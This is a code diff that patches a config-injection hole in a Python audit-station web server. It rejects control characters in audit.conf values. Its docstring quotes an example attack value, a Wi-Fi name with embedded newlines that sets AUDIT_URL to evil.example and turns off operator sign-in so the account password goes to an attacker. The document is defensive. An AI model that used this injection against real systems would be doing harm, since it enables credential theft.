@@ -175,10 +175,42 @@ def operator_signin_on():
     return v in ("1", "yes", "true", "on")
 
 
+def conf_value_problem(val):
+    """Why `val` cannot be written into audit.conf as one KEY="value" line, or
+    None when it can.
+
+    A value is written verbatim between double quotes, one setting per line.
+    A newline in it (the Wi-Fi name box accepts a pasted one) therefore
+    started a NEW line - a new setting. Settings needs no admin PIN for
+    Wi-Fi when the stick has none, and save_conf reloads the conf at once, so
+    a network name of  Warehouse<newline>AUDIT_URL="https://evil.example"
+    <newline>AUDIT_OPERATOR_SIGNIN="0"  pointed the station at another server
+    (past allowed_api_url, which guards only the server-address box) and
+    switched the operator sign-in gate off: the next login sent the station's
+    account password there. So: no line breaks, and no other control
+    character (NUL, tab, escape...), in any value. Quotes, $, backticks and
+    backslashes are fine: load_conf and the engine's als_read_conf both take
+    everything between the outer quotes literally, and a Wi-Fi password may
+    legitimately contain them."""
+    s = str(val if val is not None else "")
+    for ch in s:
+        if ord(ch) < 0x20 or ord(ch) == 0x7F:
+            return ("A setting cannot contain a line break or other control character "
+                    "(found %r). Nothing was saved." % ch)
+    return None
+
+
 def save_conf(updates):
     """Rewrite the given KEY="value" lines in audit.conf, preserving the rest.
     The USB usually mounts read-only, so this returns a clear error if it can't
-    write (the operator can remount rw, or set values from the admin console)."""
+    write (the operator can remount rw, or set values from the admin console).
+    A value conf_value_problem refuses is never written (nothing is saved)."""
+    for key, val in updates.items():
+        if not re.match(r"^[A-Za-z_][A-Za-z0-9_]*$", str(key)):
+            return "Refusing to write a setting named %r." % (key,)
+        why = conf_value_problem(val)
+        if why:
+            return why
     if not CONF_PATH:
         return "audit.conf not found on the boot media."
     try:
@@ -4081,7 +4113,15 @@ class Handler(BaseHTTPRequestHandler):
             if body.get("wipeMethod"):
                 updates["AUDIT_WIPE_METHOD"] = body["wipeMethod"]
             if "imageServer" in body:
-                updates["IMAGE_SERVER"] = body["imageServer"].strip()
+                updates["IMAGE_SERVER"] = str(body["imageServer"] or "").strip()
+            # Checked BEFORE anything is written or re-mounted: a value with a
+            # line break would add settings of its own (conf_value_problem).
+            # A 400 with the reason, and nothing saved - not a 500.
+            for val in updates.values():
+                why = conf_value_problem(val)
+                if why:
+                    return self._send(400, {"message": why})
+            if "IMAGE_SERVER" in updates:
                 IMAGE_STATE["checked"] = 0.0        # re-evaluate immediately
                 threading.Thread(target=lambda: mount_image_server(force=True),
                                  daemon=True).start()
